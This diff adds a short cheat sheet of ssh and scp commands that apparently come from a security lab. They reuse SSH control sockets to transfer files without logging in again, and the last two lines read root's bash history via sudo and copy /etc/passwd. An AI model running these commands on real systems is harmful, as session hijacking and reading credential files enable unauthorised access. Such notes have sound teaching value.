@@ -1,0 +1,8 @@
+scp -o ControlPath=/tmp/T# -P <ssh_Port> [/path/to/local/file<user>@<remote_IP>:~/
+scp -o ControlPath=/tmp/T# -P <ssh_Port> <user>@remote_ip:[/path/to/remote]<file>
+
+ssh -S /tmp/T# <user>@<Remote_IP > -p <ssh_Port> "cat <file>" > hist
+ssh -S /tmp/T# <user>@<Remote_IP > -p <ssh_Port> "cat > <file>" < hist
+
+ssh -S /tmp/T4 bad "sudo cat /root/.bash_history" > ./T4_bash_history.txt
+scp -o ControlPath=/tmp/T5 -P 5555 student4@localhost:/etc/passwd ./T5_passwd 
